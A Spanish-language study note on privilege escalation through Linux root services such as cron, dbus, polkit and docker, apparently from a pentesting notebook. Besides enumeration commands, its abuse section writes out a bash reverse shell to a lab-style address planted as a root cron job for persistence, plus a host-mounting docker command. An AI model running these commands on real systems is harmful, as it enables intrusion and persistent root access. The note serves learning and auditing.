
---
Tags: #cron #services #dbus #privilege-escalation #root #procesos 

---
## 1️⃣ Concepto

Los **servicios internos del sistema** son procesos o demonios que corren con **privilegios elevados** (root o usuarios especiales) y que ofrecen funcionalidades internas del sistema, como:

- Gestión de tareas programadas
    
- Gestión de usuarios y permisos
    
- Acceso a hardware o dispositivos
    
- Comunicación entre procesos
    

**Abusar de estos servicios** puede permitir:

- Escalada de privilegios
    
- Ejecución de código como root
    
- Acceso a información sensible
    
- Persistencia en el sistema
    

---

## 2️⃣ Tipos de servicios interesantes

|Servicio / Demonio|Privilegios típicos|Potencial de abuso|
|---|---|---|
|**cron / systemd timers**|root|Agendar ejecución de comandos como root. Ejemplo: agregar tarea que lanza reverse shell.|
|**dbus**|root o usuarios del sistema|Ejecutar acciones administrativas o acceder a procesos críticos.|
|**cups / printer service**|root|Vulnerabilidades locales; ejecución de código con privilegios de impresión.|
|**polkit**|root|Escalada de privilegios aprovechando reglas mal configuradas.|
|**ssh / ssh-agent**|root|Robo de llaves o uso de túneles.|
|**docker daemon**|root|Escalada a root a través de contenedores (visto antes).|
|**systemd socket-activated services**|root|Posibles abusos vía sockets expuestos a usuarios locales.|
|**network services internos (RPC, NFS, Samba)**|root o usuarios privilegiados|Montar sistemas de archivos, ejecutar comandos, robar datos.|

---

## 3️⃣ Cómo identificar servicios y su riesgo

### 🔹 Listar servicios activos

`systemctl list-units --type=service --state=running service --status-all`

### 🔹 Revisar permisos y propietarios

`ps aux --sort=uid    # identificar procesos de root ls -l /usr/bin /usr/sbin`

### 🔹 Ver sockets activos

`ss -lntp          # TCP ss -lnup          # UDP`

### 🔹 Revisar servicios con posibles abusos

- Servicios con **setuid root**
    

`find / -perm -4000 -type f 2>/dev/null`

- Archivos ejecutables accesibles por tu usuario que corren como root
    

`sudo -l          # si tu usuario tiene permisos sudo parciales`

---

## 4️⃣ Ejemplos de abuso prácticos

### 🔹 Cron / systemd timers

`echo "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" > /tmp/rev.sh chmod +x /tmp/rev.sh echo "* * * * * root /tmp/rev.sh" | sudo tee /etc/cron.d/rev`

- Cada minuto se ejecuta tu script como root → reverse shell persistente.
    

### 🔹 dbus

`dbus-send --system --dest=org.freedesktop.PolicyKit1 \   /org/freedesktop/PolicyKit1/Authority \   org.freedesktop.PolicyKit1.Authority.CheckAuthorization \   string:"com.example.admin-action" string:"unix-process:$(pidof bash)" boolean:true`

- Dependiendo de la configuración de polkit, puede permitir ejecutar acciones de root.
    

### 🔹 Docker (recordatorio)

- Da acceso a servicios del host a través de contenedores:
    

`docker run -v /:/mnt/root -it ubuntu bash`

---

## 5️⃣ Consejos de auditoría

1. **Documenta cada servicio que corra como root** y revisa permisos de archivos relacionados.
    
2. **Fíjate en sockets y pipes**: muchos servicios escuchan internamente y pueden ser abusados.
    
3. **Busca binarios con setuid root** que el servicio pueda ejecutar indirectamente.
    
4. **Prueba escaladas locales primero en un entorno controlado**: cron, dbus, polkit y docker suelen ser los más interesantes.
    
5. **No olvides limpiar los cambios temporales** si haces pruebas (scripts en cron, contenedores, etc).